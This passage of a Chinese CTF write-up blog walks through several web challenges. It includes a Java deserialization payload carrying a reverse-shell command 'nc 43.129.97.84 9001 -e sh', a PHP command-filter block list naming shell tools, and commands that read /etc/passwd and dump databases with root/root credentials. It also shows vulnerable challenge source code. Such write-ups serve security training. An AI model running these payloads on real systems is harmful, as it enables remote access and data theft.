class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();<br>        config.setArgs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;nc 43.129.97.84 9001 -e sh&quot;</span>&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(config);<br><br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>        objectOutputStream.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="844"><a href="#844" class="headerlink" title="844"></a>844</h2><p>给了个<code>web.war</code>文件，这东西直接解压就能拿<code>META-INF</code>和<code>WEB-INF</code>，打开看看：</p><p><code>IndexController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.GET&#125;,</span><br><span class="hljs-meta">        produces = &#123;&quot;text/html;charset=utf-8&quot;&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>();<br>        modelAndView.setViewName(<span class="hljs-string">&quot;index&quot;</span>);<br>        <span class="hljs-keyword">return</span> modelAndView;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/goPage&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.GET&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">goPage</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> Map&lt;String, String&gt; param)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> (String)param.get(<span class="hljs-string">&quot;url&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> (String)param.get(<span class="hljs-string">&quot;port&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != url &amp;&amp; <span class="hljs-literal">null</span> != param &amp;&amp; !param.isEmpty()) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(url, Integer.valueOf(port));<br>                <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(socket.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br><br>                Map.Entry p;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">Iterator</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> param.entrySet().iterator(); var9.hasNext(); request = request + (String)p.getKey() + (String)p.getValue() + <span class="hljs-string">&quot;\r\n&quot;</span>) &#123;<br>                    p = (Map.Entry)var9.next();<br>                &#125;<br><br>                out.write(request.getBytes());<br><br>                String line;<br>                <span class="hljs-keyword">while</span>((line = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    result = result + line;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                var11.printStackTrace();<br>                result = <span class="hljs-string">&quot;request error&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            result = <span class="hljs-string">&quot;url error&quot;</span>;<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/src</span><br><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">from</span> sanic_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> pydash<br><br><span class="hljs-comment"># Initialize Sanic application</span><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br><br><span class="hljs-comment"># Initialize session middleware</span><br>Session(app)<br><br><span class="hljs-comment"># Dummy class used for dynamic attribute assignment</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># Serve the index.html page</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> html.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/index.html&#x27;</span>).read()<br><br><br><span class="hljs-comment"># Login route</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">request</span>):<br>    user = request.cookies.get(<span class="hljs-string">&quot;user&quot;</span>)<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> user.lower() == <span class="hljs-string">&#x27;adm;n&#x27;</span>:  <span class="hljs-comment"># Check if user cookie is &#x27;adm;n&#x27;</span><br>        request.ctx.session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">True</span>  <span class="hljs-comment"># Set &#x27;admin&#x27; session variable</span><br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login success&quot;</span>)<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login fail&quot;</span>)<br><br><br><span class="hljs-comment"># Route to serve the source code of this script</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/src&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-built_in">open</span>(__file__).read())<br><br><br><span class="hljs-comment"># Admin route</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/admin&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-comment"># Check if the user has admin session</span><br>    <span class="hljs-keyword">if</span> request.ctx.session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            data = request.json<br>            key = data.get(<span class="hljs-string">&#x27;key&#x27;</span>)<br>            value = data.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;_.&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br>                pollute = Pollute()<br>                pydash.set_(pollute, key, value)  <span class="hljs-comment"># Set key-value pair in pollute object</span><br>                <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Exception in admin route: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;error&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br><br><br><span class="hljs-comment"># Run the Sanic application</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>先看<code>/login</code>路由：</p><p><img src="/img/sanic_1.png" alt="sanic_1"></p><p>他会把<code>cookie</code>字段中<code>user</code>对应的值转成小写之后和<code>adm;n</code>比较，如果相等会把请求会话中<code>admin</code>的值设为<code>True</code>，这里因为有个分号所以给<code>user</code>字段赋值的时候不能直接赋成分号。</p><p>一开始以为问题出在<code>lower</code>这个方法上了，以为什么特殊字符<code>lower</code>后直接变成分号了。捣鼓了半天没弄出来，看了其它师傅的wp才知道这里用个八进制编码就行：</p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18201664">参考文章</a></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">user</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;adm\073n&quot;</span><br></code></pre></td></tr></table></figure><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>dd</code>和<code>hexdump</code>没被ban，这两个都能读<code>/etc/passwd</code>：</p><p><code>cmd=dd if=/etc/passwd</code>(注意倒数第二个<code>mysql</code>用户)</p><p><img src="/img/simple_php_1.png" alt="simple_php_1"></p><p><code>cmd=hexdump /etc/passwd</code></p><p><img src="/img/simple_php_2.png" alt="simple_php_2"></p><p><code>mysql --version</code>可以确认存在数据库服务：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span> Ver <span class="hljs-number">15</span>.<span class="hljs-number">1</span> Distrib <span class="hljs-number">10</span>.<span class="hljs-number">4</span>.<span class="hljs-number">13</span>-MariaDB, for Linux (x86_64) using readline <span class="hljs-number">5</span>.<br></code></pre></td></tr></table></figure><p>弱口令用户名 <code>root</code> 密码 <code>root</code>， 连接到 MySQL 数据库。导出所有数据库的内容然后嗯搜<code>flag</code>：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>mysqldump -uroot -proot --all-databases<br></code></pre></td></tr></table></figure><p><img src="/img/simple_php_4.png" alt="simple_php_4"></p><p>学了些其他师傅的解法.</p><p>首先利用<code>burpsuite</code>传参(利用%0a换行符)能进行命令执行:</p><p><img src="/img/simple_php_5.png" alt="simple_php_5"></p><p>或者通过反弹<code>shell</code>：<a href="https://blog.csdn.net/uuzeray/article/details/139052904">参考文章</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN中的一些题目[未完成]</title>
    <link href="/2024/01/28/2024-1-28-CISCN%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/"/>
    <url>/2024/01/28/2024-1-28-CISCN%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>做题记录</p><span id="more"></span><hr><h2 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h2><p>跟着wp做的</p><p><code>main.py</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> uuid<br>from cryptography <span class="hljs-keyword">import</span> x509<br>from cryptography.hazmat.backends <span class="hljs-keyword">import</span> default_backend<br>from cryptography.hazmat.primitives <span class="hljs-keyword">import</span> hashes, serialization<br>from cryptography.hazmat.primitives.asymmetric <span class="hljs-keyword">import</span> rsa<br>from cryptography.x509.oid <span class="hljs-keyword">import</span> NameOID<br>from flask <span class="hljs-keyword">import</span> Flask<br>from flask <span class="hljs-keyword">import</span> render_template<br>from flask <span class="hljs-keyword">import</span> <span class="hljs-type">request</span><br><br><span class="hljs-variable">app</span> <span class="hljs-operator">=</span> Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">16</span>)<br><br>def <span class="hljs-title function_">get_crt</span><span class="hljs-params">(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span>:<br>    root_key = rsa.generate_private_key(<br>        public_exponent=<span class="hljs-number">65537</span>,<br>        key_size=<span class="hljs-number">2048</span>,<br>        backend=default_backend()<br>    )<br>    subject = issuer = x509.Name([<br>        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),<br>        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),<br>        x509.NameAttribute(NameOID.LOCALITY_NAME, City),<br>        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),<br>        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),<br>        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),<br>    ])<br>    root_cert = x509.CertificateBuilder().subject_name(<br>        subject<br>    ).issuer_name(<br>        issuer<br>    ).public_key(<br>        root_key.public_key()<br>    ).serial_number(<br>        x509.random_serial_number()<br>    ).not_valid_before(<br>        datetime.datetime.utcnow()<br>    ).not_valid_after(<br>        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="hljs-number">3650</span>)<br>    ).sign(root_key, hashes.SHA256(), default_backend())<br>    crt_name = <span class="hljs-string">&quot;static/crt/&quot;</span> + str(uuid.uuid4()) + <span class="hljs-string">&quot;.crt&quot;</span><br>    with <span class="hljs-title function_">open</span><span class="hljs-params">(crt_name, <span class="hljs-string">&quot;wb&quot;</span>)</span> as f:<br>        f.write(root_cert.public_bytes(serialization.Encoding.PEM))<br>    <span class="hljs-keyword">return</span> crt_name<br><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-title function_">index</span><span class="hljs-params">()</span>:<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/getcrt&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-title function_">upload</span><span class="hljs-params">()</span>:<br>    Country = request.form.get(<span class="hljs-string">&quot;Country&quot;</span>, <span class="hljs-string">&quot;CN&quot;</span>)<br>    Province = request.form.get(<span class="hljs-string">&quot;Province&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    City = request.form.get(<span class="hljs-string">&quot;City&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    OrganizationalName = request.form.get(<span class="hljs-string">&quot;OrganizationalName&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    CommonName = request.form.get(<span class="hljs-string">&quot;CommonName&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    EmailAddress = request.form.get(<span class="hljs-string">&quot;EmailAddress&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)<br><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/createlink&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>def <span class="hljs-title function_">info</span><span class="hljs-params">()</span>:<br>    json_data = &#123;<span class="hljs-string">&quot;info&quot;</span>: os.popen(<span class="hljs-string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;<br>    <span class="hljs-keyword">return</span> json.dumps(json_data)<br><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>def <span class="hljs-title function_">proxy</span><span class="hljs-params">()</span>:<br>    uri = request.form.get(<span class="hljs-string">&quot;uri&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)<br>    client = socket.socket()<br>    client.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8887</span>))<br>    msg = f<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;GET &#123;uri&#125; HTTP/1.1</span><br><span class="hljs-string">Host: test_api_host</span><br><span class="hljs-string">User-Agent: Guest</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>    client.send(msg.encode())<br>    data = client.recv(<span class="hljs-number">2048</span>)<br>    client.close()<br>    <span class="hljs-keyword">return</span> data.decode()<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>)<br><br></code></pre></td></tr></table></figure><p><code>main.go</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>staticPath := <span class="hljs-string">&quot;/app/static/crt/&quot;</span><br>oldname := c.DefaultQuery(<span class="hljs-string">&quot;oldname&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>newname := c.DefaultQuery(<span class="hljs-string">&quot;newname&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> oldname == <span class="hljs-string">&quot;&quot;</span> || newname == <span class="hljs-string">&quot;&quot;</span> || strings.Contains(oldname, <span class="hljs-string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="hljs-string">&quot;..&quot;</span>) &#123;<br>c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;error&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> c.Request.URL.RawPath != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>err := os.Rename(staticPath+oldname, staticPath+newname)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, newname)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, <span 